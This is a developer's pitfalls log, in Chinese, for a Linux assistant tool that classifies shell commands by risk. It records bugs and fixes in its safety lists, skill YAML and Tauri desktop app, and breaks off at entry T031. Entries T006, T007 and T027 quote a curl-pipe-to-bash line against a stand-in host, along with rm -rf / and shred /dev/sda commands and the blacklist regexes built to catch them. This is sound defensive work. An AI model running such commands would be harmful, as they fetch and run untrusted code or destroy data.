# Lihua 狸花猫 - 踩坑记录

## 编号规则

- 编号递增（T001, T002, ...）
- 三段式：现象 → 根因 → 解决方案
- 用 `---` 分隔

## 记录

### T001: Python 3.14 无 pip / ensurepip

**现象**：
```
$ python3 -m pip
/usr/bin/python3: No module named pip
$ python3 -m ensurepip
/usr/bin/python3: No module named ensurepip
```

**根因**：
Ubuntu 24.04+ 的 `python3` 包默认不带 `pip` 和 `ensurepip`，需要单独装 `python3-pip` / `python3-venv` / `python3-full`。

**解决方案**：
```bash
sudo apt install -y python3-pip python3-venv python3-full
```
之后用 `python3 -m venv` 创建 venv，再用 venv 里的 pip。

---

### T002: PEP 668 externally-managed-environment

**现象**：
```
$ pip install -e .
error: externally-managed-environment
× This environment is externally managed
╰─> See PEP 668 for details.
```

**根因**：
PEP 668（Python 3.11+）阻止系统级 pip 安装包，避免破坏系统 Python 环境。`/usr/lib/python3.x/EXTERNALLY-MANAGED` 文件标记此环境受系统包管理器管理。

**解决方案**：
用 venv 隔离：
```bash
python3 -m venv ~/.local/share/lihua/venv
~/.local/share/lihua/venv/bin/pip install -e '.[dev]'
```
然后软链到 `~/.local/bin/lihua` 让命令全局可用。

不要用 `--break-system-packages` 绕过——会污染系统 Python。

---

### T003: `[project.scripts]` 不走 `__main__.py` 预处理

**现象**：
```
$ lihua "装QQ"
Usage: lihua [OPTIONS] COMMAND [ARGS]...
Error: No such command '装QQ'.
```
必须显式写 `lihua run "装QQ"` 才能用。

**根因**：
`pyproject.toml` 里 `[project.scripts]` 入口写成 `lihua = "lihua.cli:app"`，typer 直接调 `cli.app()`，绕过了 `__main__.py` 里设计的 sys.argv 预处理（识别"第一个参数不是已知子命令就插入 run"）。

**解决方案**：
改 `pyproject.toml`：
```toml
[project.scripts]
lihua = "lihua.__main__:main"
```
让入口指向 `__main__.py` 的 `main()`，预处理逻辑始终被调用。

文件：`pyproject.toml` 第 47-48 行。

---

### T004: config.toml `[general]` 子表解析

**现象**：
`config.toml` 里写了：
```toml
[general]
always_confirm_grey = true
auto_execute_whitelist = true
```
但运行时这些配置不生效（始终走默认值）。

**根因**：
`Config._from_dict` 直接从顶层 dict 找 `always_confirm_grey`：
```python
always_confirm_grey=bool(raw.get("always_confirm_grey", True)),
```
但 TOML 用 `[general]` 子表后，这些键在 `raw["general"]` 里，不在顶层。

**解决方案**：
`_from_dict` 兼容两种写法（子表 + 顶层平铺）：
```python
general = raw.get("general", {}) if isinstance(raw.get("general"), dict) else {}
always_confirm_grey=bool(general.get("always_confirm_grey", raw.get("always_confirm_grey", True))),
```
先读 `[general]` 子表，缺失再从顶层补齐。

文件：`src/lihua/config.py` 的 `Config._from_dict`。

---

### T005: `_execute_step` 拿不到 skill 的 aliases

**现象**：
`install_app` skill 的 `resolve_package` 步骤返回 `None`，导致后续安装步骤因 `package` 变量为空而失败。

**根因**：
`skill_runner.py` 的 `_execute_step` 函数用 `step_to_skill(step)` 占位函数生成 SkillDef，但这个占位函数返回空壳（`aliases={}`），导致 `resolve_alias(target)` 始终返回空列表。

**解决方案**：
- 把 `skill: SkillDef` 作为 `_execute_step` 的参数传入，替代占位函数
- 删除 `step_to_skill` 占位函数
- 顺手清理未使用的 import（`shlex` / `SafetyDecision` / `describe_for_user`）

文件：`src/lihua/skill_runner.py` 的 `_execute_step` 签名和 `run_skill` 调用点。

---

### T006: `curl | bash` 因 pipe 拆分导致漏检

**现象**：
```
classify("curl https://evil.sh | bash").level
# 实际: 'unknown'
# 期望: 'black'
```

**根因**：
`safety.py` 的 `classify()` 先用 `_CMD_SEPARATORS` 按 `;|&&||` 拆分复合命令，再对每个子命令单独分类。`curl ... | bash` 被拆成 `curl ...` 和 `bash`：
- `curl https://evil.sh` 不匹配黑名单（白名单只匹配 `curl -I` / `curl -L`）
- `bash` 单独看不匹配任何规则，是 unknown
- 整体取最严 = unknown

黑名单里有 `curl\s+[^|]*\|\s*(?:sh|bash|...)` 这种整体匹配的正则，但因为先拆分了，所以从未被调用。

**解决方案**：
在 `classify()` 拆分前先做一次整体黑名单匹配：
```python
def classify(command: str) -> SafetyDecision:
    command = (command or "").strip()
    if not command:
        return SafetyDecision(level="unknown", reason="空命令")

    # 整体黑名单检测：在拆分前先匹配，捕获含 | & ; 的危险复合模式
    for pattern, reason in _BLACKLIST_COMPILED:
        if pattern.search(command):
            return SafetyDecision(level="black", rule=pattern.pattern,
                                  reason=reason, human_message=reason)

    # 然后再拆分...
```

文件：`src/lihua/safety.py` 的 `classify()` 函数。

---

### T007: `rm -rf /*` 正则未覆盖通配符

**现象**：
```
classify("rm -rf /*").level  # 'unknown'，期望 'black'
classify("rm -rf /home /etc").level  # 'unknown'，期望 'black'
```

**根因**：
原黑名单正则：
```python
r"rm\s+(?:-[a-zA-Z]*r[a-zA-Z]*\s+)?.../+(\s|$)"
```
要求 `/` 后面是空格或行尾，但 `rm -rf /*` 的 `/` 后面是 `*`，不匹配。
另外目录列表里没有 `home`，`rm -rf /home /etc` 也不匹配。

**解决方案**：
重写 rm 相关黑名单为 4 条精确正则：
```python
(r"rm\s+(?:-\w+\s+)*--no-preserve-root", "..."),  # 显式 --no-preserve-root
(r"rm\s+(?:-\w*r\w*\s+)+/(\s|$)", "..."),          # rm -rf /
(r"rm\s+(?:-\w*r\w*\s+)+/\*", "..."),              # rm -rf /*
(r"rm\s+(?:-\w*r\w*\s+)+/(?:boot|etc|usr|var|bin|sbin|lib|sys|proc|dev|home|root|opt|srv)(?:\s|$)", "..."),
```

注意第 4 条结尾是 `(?:\s|$)` 而非 `(?:\s|$|/)`——这样 `rm -rf /etc/foo` 不会被误判为 black（删整个系统目录才 ban，删具体文件走灰名单）。

文件：`src/lihua/safety.py` 的 `_BLACKLIST` 列表。

---

### T008: `fc-cache -fv` / `tar -xzf` 白名单正则字符集不全

**现象**：
```
classify("fc-cache -fv").level  # 'unknown'，期望 'white'
classify("tar -xzf archive.tar.gz").level  # 'unknown'，期望 'white'
```

**根因**：
- `fc-cache` 白名单正则 `r"fc-cache(?:\s+-[fv])?\s*$"`：`[fv]` 只匹配单字符，`-fv` 是两字符不匹配
- `tar` 白名单正则 `r"\btar\s+-[tjxz]+\s+"`：`[tjxz]` 不含 `f`，`-xzf` 不匹配

**解决方案**：
- `fc-cache` 改为 `r"\bfc-cache\b"`：命令本身安全，参数任意组合都接受
- `tar` 改为 `r"\btar\s+-[a-zA-Z]+\s+"`：任意 flag 组合都接受

文件：`src/lihua/safety.py` 的 `_WHITELIST` 列表。

---

### T009: trigger 匹配未做去空格预处理

**现象**：
```
registry.match_by_text("用 fcitx5")  # 返回 []，期望匹配 switch_im
```
switch_im 的 trigger 里有 `用fcitx5`（无空格），但用户输入 `用 fcitx5`（带空格）。

**根因**：
原 `match_trigger` 直接做 `t in text` 子串匹配：
```python
def match_trigger(self, text: str) -> bool:
    text_lower = text.lower()
    for t in self.triggers:
        if t.lower() in text_lower:
            return True
    return False
```
中英文混合场景下，trigger 写"用fcitx5"会漏匹配"用 fcitx5"。

**解决方案**：
增加去空格后的退化匹配：
```python
def match_trigger(self, text: str) -> bool:
    text_lower = text.lower()
    text_nospace = re.sub(r"\s+", "", text_lower)
    for t in self.triggers:
        t_lower = t.lower()
        if t_lower in text_lower:
            return True
        t_nospace = re.sub(r"\s+", "", t_lower)
        if t_nospace and t_nospace in text_nospace:
            return True
    return False
```

文件：`src/lihua/skills.py` 的 `SkillDef.match_trigger`。

---

### T010: install_font 误匹配 install_app（多 Skill 同时匹配时无优先级）

**现象**：
```
understand("装个思源黑体", cfg, registry).skill_name
# 实际: 'install_app'（错误）
# 期望: 'install_font'
```

**根因**：
install_app 和 install_font 的 triggers 都含 "装" / "安装"，"装个思源黑体" 同时匹配两个 Skill。`match_by_text` 只按 trigger 长度降序排序，两者最长 trigger 都是"安装应用"（4 字），相同长度按 dict 插入顺序，install_app 先加载排在前。

**解决方案**：
在 `match_by_text` 加 alias 命中优先级：
```python
def priority(s: SkillDef) -> tuple[int, int]:
    # 是否能从文本提取参数并命中别名表
    alias_hit = 0
    try:
        params = s.extract_params(text)
    except Exception:
        params = {}
    for v in params.values():
        if v and s.resolve_alias(v):
            alias_hit = 1
            break
    max_trigger_len = max((len(t) for t in s.triggers), default=0)
    return (alias_hit, max_trigger_len)

matched.sort(key=priority, reverse=True)
```

逻辑：能从文本提取参数且参数命中别名表的 Skill 优先级最高（精确度最高）。"装个思源黑体"：
- install_app 提取出 "思源黑体"，但别名表里没有 → alias_hit=0
- install_font 提取出 "思源黑体"，别名表里有 → alias_hit=1

所以 install_font 排前。

文件：`src/lihua/skills.py` 的 `SkillRegistry.match_by_text`。

---

### T011: `lihua gui` 被预处理成 `lihua run gui`

**现象**：
```
$ lihua gui
理解中：gui
⚠ 这个请求我暂时还不会处理
```
明明注册了 `gui` 子命令，却被当成 `lihua run "gui"` 走了 run_cmd。

**根因**：
`__main__.py` 的 `_preprocess_argv` 实现默认子命令机制：第一个参数不在 `_KNOWN_SUBCOMMANDS` 集合中就插入 `run`。新增 `gui` 命令后忘记把 `"gui"` 加进集合，导致 `lihua gui` → `lihua run gui`。

**解决方案**：
`src/lihua/__main__.py` 的 `_KNOWN_SUBCOMMANDS` 集合同步加入新命令名：
```python
_KNOWN_SUBCOMMANDS = {
    "run", "ask", "chat", "skills", "config", "doctor",
    "serve", "gui", "install", "uninstall-service", "history", "audit",
    "--help", "-h", "--version", "-V", "help",
}
```
以后每加一个 typer 子命令，都要同步更新这个集合。

文件：`src/lihua/__main__.py`。

---

### T012: vite proxy 端口与 `lihua serve` 默认端口不一致

**现象**：
浏览器打开 GUI 后，所有 `/api/*` 请求 502 / connection refused。

**根因**：
- `desktop/vite.config.ts` 中 `proxy.target = 'http://localhost:7531'`
- `src/lihua/cli.py` 中 `serve` 命令默认 `port=7788`
- `install` 命令生成的 systemd service 里也是 `--port 7788`

三处端口对不上，前端请求被代理到 7531 但后端在 7788。

**解决方案**：
统一为 7531：
- `serve` 命令默认 `port=7531`
- `install` 命令模板 `ExecStart={lihua_bin} serve --host 127.0.0.1 --port 7531`
- `gui` 命令 `DEFAULT_GUI_BACKEND_PORT = 7531`

文件：`src/lihua/cli.py` 的 `serve` / `install` / `gui` 三处。

---

### T013: flatpak 多个同名 remote 导致 install 失败

**现象**：
```
$ lihua "装QQ"
错误： 未选择远程仓库以解决"com.qq.QQ"的匹配项
找到具有与"com.qq.QQ"相似引用的远程仓库：
   1) 'flathub' (system)
   2) 'flathub' (user)
您要使用哪个（0 为放弃）？ [0-2]: 0
```

**根因**：
用户系统同时配置了 `flathub (system)` 和 `flathub (user)` 两个同名 remote。`install-app.yaml` 原命令 `flatpak install -y --noninteractive flathub {{package}}` 显式指定 remote 名 `flathub`，flatpak 发现同名歧义后即使 `--noninteractive` 也报错（因为无法自动二选一）。

**解决方案**：
命令中不显式指定 remote，让 flatpak 自己从所有 remote 搜索匹配的 application ID：
```yaml
command: "flatpak install -y --noninteractive {{package}}"
```

注意：这种方式仅在 `{{package}}` 是完整 flatpak application ID（如 `com.qq.QQ`）时可靠。如果是模糊名（如 `qq`），flatpak 仍会询问选哪个 remote。

文件：`src/lihua/data/skills/install-app.yaml` 的 `install_via_flatpak` 步骤。

---

### T014: skill_runner 忽略 YAML `safety` 字段，flatpak install 误判 white 不弹确认

**现象**：
YAML 中 `install_via_flatpak` 标了 `safety: grey` + `confirm: "安装 QQ..."`，但 `auto_confirm=false` 请求时直接执行了 `flatpak install` 命令（没弹确认框），返回失败结果。

**根因**：
`skill_runner.py` 的 `_execute_step` 只看 `classify(cmd)` 的结果，**完全忽略 YAML 中的 `step.safety` 字段**：
```python
decision = classify(cmd)
if decision.level == "grey":
    # 弹确认
```

而 `safety.py` 的 `_WHITELIST` 第 144 行有：
```python
(r"flatpak\s+install\s+", "安装 Flatpak 应用"),
```
所以 `flatpak install -y --noninteractive com.qq.QQ` 被 classify 判为 white，跳过灰名单确认流程，直接执行。

YAML 的 `safety: grey` 标注形同虚设。

**解决方案**：
取 YAML `safety` 字段和 `classify()` 结果中**更严格的一方**：
```python
yaml_safety = (step.safety or "").strip().lower()
if yaml_safety == "grey":
    effective_level = "grey"  # YAML 标 grey，无论 classify 返回什么，都走 grey
elif yaml_safety == "black":
    # YAML 显式标 black：拒绝
    ...
else:
    effective_level = decision.level  # 用 classify 结果

if effective_level == "grey":
    # 走灰名单确认
```

设计原则：YAML `safety` 是 skill 作者对"这个步骤是否需要用户确认"的声明，应优先于 `classify()` 的命令文本匹配。`classify()` 仅作为兜底（YAML 没标 safety 时）。

文件：`src/lihua/skill_runner.py` 的 `_execute_step`。

---

### T015: install-app.yaml QQ flatpak ID 错误

**现象**：
```
$ flatpak install -y --noninteractive com.tencent.qq
错误： 未发现用于"com.tencent.qq"的远程引用
```

**根因**：
`install-app.yaml` 的 aliases 中 QQ 的 flatpak ID 写成 `com.tencent.qq`，但 flathub 上 Linux QQ 的实际 application ID 是 `com.qq.QQ`。

**解决方案**：
```yaml
QQ: ["com.qq.QQ", "linuxqq"]
qq: ["com.qq.QQ", "linuxqq"]
```
顺手把微信的 `com.tencent.weixin` 改为 `com.tencent.WeChat`（实际 flathub ID）。

验证命令：`flatpak search qq` / `flatpak search tencent`。

文件：`src/lihua/data/skills/install-app.yaml` 的 `aliases`。
同步更新：`tests/test_skills.py` 的 `test_qq_resolves_to_flatpak` / `test_render_template` / `test_is_flatpak_id`。

---

### T016: Tauri 编译错误 - `emit` 方法未找到

**现象**：
```
error[E0599]: no method named `emit` found for struct `AppHandle<R>` in the current scope
   --> src/lib.rs:109:33
    |
109 |                     let _ = app.emit("backend-ready", ());
    |                                 ^^^^
```

**根因**：
Tauri 2.x 把 `emit` 方法拆到了 `Emitter` trait 里，但该 trait 不在 prelude 中，需要显式 `use`。

**解决方案**：
在 `src/lib.rs` 顶部加：
```rust
use tauri::{AppHandle, Emitter, Manager, WebviewWindow};
```
文件：`desktop/src-tauri/src/lib.rs`。

---

### T017: Tauri 编译错误 - `handle()` 方法未找到

**现象**：
```
error[E0599]: no method named `handle` found for reference `&AppHandle` in the current scope
   --> src/lib.rs:219:9
    |
219 |     app.handle().plugin(
    |         ^^^^^^
```

**根因**：
Tauri 2.x 移除了 `AppHandle::handle()` 方法。直接在 `AppHandle` 上调用 `plugin()` 即可（`AppHandle` 实现了 `Manager` trait，`plugin()` 是 `Manager` 的方法）。

**解决方案**：
```rust
// 错误：app.handle().plugin(...)
// 正确：
app.plugin(plugin)?;
```
文件：`desktop/src-tauri/src/lib.rs` 的 `register_global_shortcut`。

---

### T018: Tauri 编译错误 - `From<global_shortcut::Error>` 未实现

**现象**：
```
error[E0277]: `?` couldn't convert the error to `tauri::Error`
   --> src/lib.rs:221:37
    |
221 |             .with_shortcut(shortcut)?
    |              -----------------------^ the trait `From<tauri_plugin_global_shortcut::Error>` is not implemented for `tauri::Error`
```

**根因**：
Tauri 2.x 的 `tauri::Error` 没有实现 `From<tauri_plugin_global_shortcut::Error>`，所以 `?` 操作符不能自动转换。

**解决方案**：
改用 `GlobalShortcutExt` 扩展方法 + `map_err` 手动转换：
```rust
let plugin = tauri_plugin_global_shortcut::Builder::new()
    .with_handler(move |app, _shortcut, event| {
        if event.state == ShortcutState::Pressed {
            toggle_main_window(app);
        }
    })
    .build();
app.plugin(plugin)?;
app.global_shortcut()
    .register(shortcut)
    .map_err(|e| tauri::Error::Anyhow(anyhow::anyhow!("注册快捷键失败: {}", e)))?;
```
文件：`desktop/src-tauri/src/lib.rs` 的 `register_global_shortcut`。

---

### T019: Tauri 运行时 panic - logger 冲突

**现象**：
```
PluginInitialization("log", "attempted to set a logger after the logging system was already initialized")
```

**根因**：
代码里同时用了 `env_logger::init()` 和 `tauri_plugin_log`。两者都会初始化全局 logger，但 Rust 的 logger 只能初始化一次。

**解决方案**：
移除 `env_logger` 的初始化代码 + 移除 `env_logger` 依赖。统一用 `tauri_plugin_log::Builder::default().level(log::LevelFilter::Info).build()`：
```rust
tauri::Builder::default()
    .plugin(tauri_plugin_log::Builder::default()
        .level(log::LevelFilter::Info)
        .build())
    // ...
```
文件：`desktop/src-tauri/src/lib.rs` + `desktop/src-tauri/Cargo.toml`（移除 `env_logger` 依赖）。

---

### T020: 全局快捷键 Ctrl+Alt+L 在 GNOME Wayland 下不工作

**现象**：
Tauri 日志显示 `全局快捷键已注册：Ctrl+Alt+L`，但用户按 Ctrl+Alt+L 没反应。

**根因**：
Tauri 2.x 的 `tauri-plugin-global-shortcut` 在 Linux 上依赖 X11 的 `XGrabKey` API。GNOME Wayland 不支持 X11 全局快捷键拦截（Wayland 安全模型不允许应用全局监听键盘事件）。

**解决方案**：
1. **接受现状**：Wayland 下快捷键不工作，依赖托盘点击 + 小球点击触发主窗口
2. **替代方案**（未实现）：让用户在 GNOME 设置 → 键盘 → 自定义快捷键 中手动添加快捷键，命令为 `gdbus call --session --dest cn.lihua.desktop --method cn.lihua.desktop.ToggleMain`（需要 Tauri 暴露 DBus 接口）
3. **未来方案**：用 `org.gnome.Shell` DBus Eval（需要 unsafe mode）或 layer-shell 协议

文件：`desktop/src-tauri/src/lib.rs` 的 `register_global_shortcut`。

---

### T021: 浮动小球窗口位置由 GNOME 决定（Wayland 限制）

**现象**：
`tauri.conf.json` 配置 `"x": 24, "y": 120`，但浮动小球出现在屏幕中央。

**根因**：
Wayland 安全模型不允许应用主动定位窗口（防止应用覆盖整个屏幕或干扰其他窗口）。`x` / `y` 配置在 X11 下生效，在 Wayland 下被忽略。GNOME Mutter 把窗口默认放在屏幕中央。

**解决方案**：
1. **接受现状**：小球首次出现在屏幕中央，用户可以拖动到任意位置
2. **未来方案**（未实现）：用 `gtk-layer-shell` 协议（需要 `libgtk-layer-shell-dev` 依赖 + Tauri 自定义扩展），可以锚定到屏幕边缘

文件：`desktop/src-tauri/tauri.conf.json` 的 `bubble` 窗口配置。

---

### T022: 透明窗口在 GNOME Wayland 下不显示

**现象**：
`tauri.conf.json` 配置 `"transparent": true`，浮动小球窗口完全不显示（用户看不到任何元素）。

**根因**：
GNOME Mutter 在 Wayland 下对透明窗口的支持不完整。无边框 + 透明 + skipTaskbar 的组合可能导致窗口被合成器忽略或渲染为完全透明（看不见）。

**解决方案**：
bubble 窗口改为非透明 + 圆角方块：
```json
{
  "label": "bubble",
  "width": 96,
  "height": 96,
  "transparent": false,
  "decorations": false,
  "alwaysOnTop": true,
  "shadow": true
}
```
Bubble.tsx 根容器用深色半透明背景 + 圆角：
```tsx
background: 'rgba(20, 20, 20, 0.85)',
backdropFilter: 'blur(4px)',
borderRadius: '48px',
```
这样窗口本身可见（96×96 圆角方块），中心放绿色圆形 🐱。

文件：`desktop/src-tauri/tauri.conf.json` + `desktop/src/Bubble.tsx`。

---

### T023: `cargo build --release` 不嵌入前端资源，运行时回退到 devUrl

**现象**：
用 `cargo build --release` 编译的 Tauri 二进制，启动后主浮窗显示 "Could not connect to localhost: Connection refused"。

**根因**：
`cargo build --release` 只编译 Rust 代码，不会：
1. 触发 `beforeBuildCommand`（npm run build）生成 `dist/`
2. 通过 `build.rs` 把 `dist/` 嵌入到二进制资源中

Tauri 2.x 的资源嵌入机制依赖 `tauri-cli` 在编译前调用 `beforeBuildCommand` 生成前端资源，然后 `tauri_build::build()` 在 `build.rs` 中读取 `dist/` 并嵌入。直接 `cargo build` 跳过了这一步。

运行时 Tauri 找不到嵌入的资源，回退到 `devUrl`（`http://localhost:5173`），但 vite dev server 没启动，所以连接被拒绝。

**解决方案**：
用 `npx tauri build --no-bundle` 而不是 `cargo build --release`：
```bash
npx tauri build --no-bundle
```
- `tauri build` 会先跑 `beforeBuildCommand` 生成 `dist/`
- 然后通过 `build.rs` 把 `dist/` 嵌入到二进制
- `--no-bundle` 跳过 deb/appimage 打包（我们只需要二进制）

验证二进制是否嵌入资源：
```bash
strings target/release/lihua-desktop | grep "tauri://localhost"
```
应该能看到 `tauri://localhost` 和 `index.html` 字符串。

文件：`src/lihua/cli.py` 的 `_build_tauri`。

---

### T024: YAML description 含 `冒号+空格` 被解析为 mapping

**现象**：
```
[lihua] Skill 加载失败 .../ppa-management.yaml: mapping values are not allowed here
  in ".../ppa-management.yaml", line 25, column 48
```
对应行：
```yaml
    description: PPA 名（如 git-core/ppa，可带或不带 ppa: 前缀）
```

**根因**：
YAML 规范中，`key: value`（冒号 + 空格）在未引号的 plain scalar 中会被解析为 mapping。description 的值 `...ppa: 前缀` 中的 `ppa: `（冒号后跟空格）被 YAML 解析器当作一个新的 mapping key，与外层 `description:` 冲突，导致 "mapping values are not allowed here" 报错。
注意：`ppa:xxx`（冒号后无空格）不会触发，只有 `ppa: xxx`（冒号+空格）才触发。

**解决方案**：
description 中凡含 `冒号+空格` 的，整体用双引号包裹：
```yaml
    description: "PPA 名（如 git-core/ppa，可带或不带 ppa: 前缀）"
```
文件：`src/lihua/data/skills/ppa-management.yaml` line 25。所有 Skill YAML 的 description 字段若含 `xxx: yyy` 模式都需引号包裹。

**v0.7.11 复发**：`beautify-ubuntu.yaml` line 2 又踩同一坑：
```yaml
description: 美化 Ubuntu 桌面...。v0.7.11: macOS 风格新增字体安装 + ...
```
`v0.7.11: macOS` 中的 `: `（冒号+空格）被解析为 mapping。修复方式同上：整体加双引号。教训：编辑 YAML description 时务必检查是否含 `冒号+空格`，含则必须引号包裹。

---

### T025: 参数提取正则 `\s+` 在关键词与参数无空格相邻时失效

**现象**：
`apt_repository` 的 repo 参数提取为 None，明明输入 "添加仓库 ppa:obsproject/obs-studio" 应提取出 "ppa:obsproject/obs-studio"：
```python
params = s.extract_params("添加仓库 ppa:obsproject/obs-studio")
# 期望：{'action': '添加', 'repo': 'ppa:obsproject/obs-studio'}
# 实际：{'action': '添加'}  # repo 缺失
```

**根因**：
任务原给的正则 `(?:添加|删除|移除)\\s+(?:仓库\\s+)?(.+?)\\s*$` 中，`\\s+`（一个或多个空白）要求"添加"后必须有空格才能匹配。但中文输入 "添加仓库" 中"添加"和"仓库"之间没有空格，`\s+` 匹配失败，整个正则不命中，repo 参数提取为空。

**解决方案**：
把第一个 `\\s+` 改为 `\\s*`（零个或多个空白），允许关键词与可选子模式（如"仓库"）直接相邻：
```yaml
    extract: "(?:添加|删除|移除)\\s*(?:仓库\\s+)?(.+?)\\s*$"
```
- "添加仓库 ppa:..." → `(?:添加)` + `\s*`（匹配空）+ `(?:仓库\s+)?`（匹配"仓库 "）+ `(.+?)`（匹配"ppa:..."）✓
- "添加 仓库 ppa:..." → `(?:添加)` + `\s*`（匹配" "）+ `(?:仓库\s+)?`（匹配"仓库 "）+ `(.+?)` ✓
- "添加 ppa:..." → `(?:添加)` + `\s*`（匹配" "）+ `(?:仓库\s+)?`（跳过）+ `(.+?)` ✓

文件：`src/lihua/data/skills/apt-repository.yaml` line 27、`src/lihua/data/skills/ppa-management.yaml` line 26。涉及中文动词 + 可选名词前缀的提取正则都应注意 `\s+` vs `\s*` 的选择。

---

### T026: safety 灰名单正则未排除查询命令导致 rsync --version / ssh-keygen -l 误判 grey

**现象**：
```
classify("rsync --version").level       # 实际 'grey'，期望 'white'
classify("rsync -avn /src/ /dst/").level # 实际 'grey'，期望 'white'
classify("ssh-keygen -l -f ~/.ssh/id_ed25519.pub").level  # 实际 'grey'，期望 'white'
classify("ssh-keygen -y -f ~/.ssh/id_ed25519").level      # 实际 'grey'，期望 'white'
classify("prime-select --query").level  # 实际 'grey'，期望 'white'
```

**根因**：
v0.5.0 新增灰名单时只写了主命令模式，没有排除查询 / 模拟类子命令：
```python
(r"\brsync\b\s+(?!.*--dry-run)", ...),         # 漏了 --version / -avn
(r"\bssh-keygen\b", ...),                       # 完全没排除 -l（看指纹）/ -y（导出公钥）
(r"\bprime-select\b\s+\S+", ...),               # \S+ 把 --query 也吃进去了
```
`_classify_single` 按 黑 → 灰 → 白 顺序匹配，灰名单先生效，白名单的 `rsync --version` 永远跑不到。

**解决方案**：
用负向先行断言（negative lookahead）在灰名单中排除查询类子命令：
```python
# rsync：排除 --dry-run / --version / -avn
(r"\brsync\b\s+(?!.*--dry-run)(?!.*--version)(?!.*-avn)", ...),
# ssh-keygen：排除 -l / -y / --help
(r"\bssh-keygen\b\s+(?!-l\b)(?!-y\b)(?!--help\b)", ...),
# prime-select：排除 --query / -query
(r"\bprime-select\b\s+(?!-?-query\b)\S+", ...),
```
负向先行断言放在 `\s+` 后、`\S+` 前，能基于后续参数决定是否匹配。`\b` 加在子命令边界避免 `-l` 误匹配 `-lookup` 等。

文件：`src/lihua/safety.py` 的 `_GREYLIST` 列表 v0.5.0 新增条目。

---

### T027: safety 黑名单 shred 正则 `(?:-\w+\s+)*` 无法匹配带参数的 flag 如 `-n 3`

**现象**：
```
classify("shred -uvz -n 3 /dev/sda").level  # 实际 'grey'，期望 'black'
classify("shred /dev/nvme0n1").level        # 实际 'grey'（命中灰名单），期望 'black'
```

**根因**：
v0.5.0 第一版 shred 黑名单正则：
```python
(r"shred\s+(?:-\w+\s+)*\s*/dev/(?:sd|nvme|vd|hd|mmcblk)", "shred 覆写整个磁盘"),
```
`(?:-\w+\s+)*` 只能匹配 `-uvz` 这种"flag 后直接空格"的形式，匹配不了 `-n 3`（`-n` 后跟参数 `3` 再跟 `/dev/sda`）。漏匹配后 shred 命令落到灰名单 `\bshred\b\s+(?!.*\s/dev/...)` 里——但灰名单的负向先行断言排除了 `/dev/sd`，应该不匹配，实际匹配到的是 `\bdd\b\s+if=` 兜底？不，shred 不命中任何灰名单，于是落到 unknown → 默认 grey。

**解决方案**：
不要试图穷举所有 flag 组合，改用最简模式——只要 shred 命令中出现 `/dev/sd*` 等裸磁盘路径就 ban：
```python
(r"shred\s+.*?/dev/(?:sd|nvme|vd|hd|mmcblk)", "shred 覆写整个磁盘，数据将永久丢失"),
```
`.*?` 非贪婪匹配中间任意字符（含 flag + 参数），保证只要 shred 后面任何位置出现 `/dev/sd` 就命中黑名单。

同时把 shred 普通文件（非 /dev/）放到灰名单：
```python
(r"\bshred\b\s+(?!.*\s/dev/(?:sd|nvme|vd|hd|mmcblk))",
 "安全删除文件（覆写后删除）", "安全删除文件（不可恢复）"),
```
负向先行断言确保 shred /dev/sd 已被黑名单 ban 后，灰名单不会再处理。

文件：`src/lihua/safety.py` 的 `_BLACKLIST` 和 `_GREYLIST` 中的 shred 规则。

---

### T028: safety 白名单 `\s+$` 要求至少一个空白字符导致 `systemd-analyze` 无参数时 unknown

**现象**：
```
classify("systemd-analyze").level  # 实际 'unknown'，期望 'white'
classify("systemd-analyze ").level # 实际 'white'（带尾空格才命中）
```

**根因**：
v0.5.0 第一版白名单正则：
```python
(r"\bsystemd-analyze\b\s+(?:blame|critical-chain|time)\b", "分析启动时间"),
(r"\bsystemd-analyze\b\s+$", "查看启动耗时"),
```
第二条 `\s+$` 要求 `\s+`（一个或多个空白字符）+ 字符串结尾。`systemd-analyze`（无参数、无尾空格）不匹配 `\s+`，于是落到 unknown → 默认 grey，本应自动执行的查询命令变成需要确认。

**解决方案**：
把 `\s+$` 改为 `\s*$`（零个或多个空白字符 + 结尾）：
```python
(r"\bsystemd-analyze\b\s*$", "查看启动耗时"),
```
这样 `systemd-analyze`（无参数）和 `systemd-analyze `（带尾空格）都能命中白名单。

文件：`src/lihua/safety.py` 的 `_WHITELIST` 中的 systemd-analyze 规则。

---

### T029: 并行 subagent 开发时多个 subagent 修改同一文档导致版本号冲突

**现象**：
v0.5.0 开发用 6 个并行 Task subagent 同时创建不同分组的 Skill YAML + 测试文件，每个 subagent 都被指示"完成后追加 process.md / traps.md"。开发结束后查看：
- `process.md` 顶部"当前版本"写 `v0.4.0-alpha`
- `process.md` 版本历史里多了 `v0.4.1-alpha` 和 `v0.4.2-alpha` 两个 subagent 自创的条目
- `traps.md` 多了 T024、T025 两个 subagent 自创的条目
- 真正的 v0.5.0-alpha 条目和 T026+ 都没写

**根因**：
subagent 各自只看到自己负责的那一组 Skill，不知道整体版本号是 v0.5.0a0，于是按自己的局部进度自创了 v0.4.1 / v0.4.2 这种"小版本号"。同时多个 subagent 并发写同一文件，文件锁竞争 + 内容覆盖 + 追加位置不一致，导致最终文档内容混乱。

**解决方案**：
1. **不让 subagent 写文档**：把文档维护工作从 subagent 任务里剥离，全部由主会话统一整理。
2. **主会话统一整理**：在所有 subagent 完成后，主会话读取文档当前状态，识别 subagent 追加的内容，合并为统一的 v0.5.0-alpha 条目。
3. **subagent 只负责代码**：Skill YAML + 测试文件交给 subagent，文档（process.md / traps.md / README.md / SESSION_CONTEXT.md）由主会话自己写。

具体合并策略：
- v0.4.1-alpha 和 v0.4.2-alpha 保留作为历史记录（不删除），但在其上方追加完整的 v0.5.0-alpha 条目，包含所有 6 组 Skill 的总览。
- T024 / T025 内容正确，保留。在其后追加 T026+ 主会话整理时遇到的坑。

文件：`process.md` + `traps.md`（本会话统一整理）。

---

### T030: OpenAI function calling 的 tool_calls 嵌套在 message 里，不是顶层字段

**现象**：
v0.6.0 第一版 `_call_openai_compat_with_tools()` 从返回里取 tool_calls 时报错 None。

**根因**：
OpenAI 兼容端点的 function calling 返回结构是：
```json
{
  "choices": [{
    "message": {
      "role": "assistant",
      "content": null,
      "tool_calls": [{...}]
    },
    "finish_reason": "tool_calls"
  }]
}
```
`tool_calls` 嵌套在 `choices[0].message.tool_calls` 里，不是顶层。第一版代码错误地从 `data["tool_calls"]` 取值。

**解决方案**：
```python
msg = data["choices"][0]["message"]
text = msg.get("content") or ""
tool_calls = msg.get("tool_calls")  # 从 message 里取
```
同时把 `finish_reason` 也存下来，Agent 主循环用它判断 LLM 是否还要继续调用工具。

文件：`src/lihua/router.py` 的 `_call_openai_compat_with_tools()`。

---

### T031: LLM 返回 tool_calls 时 content 可能为 null，不能直接当字符串用

**现象**：
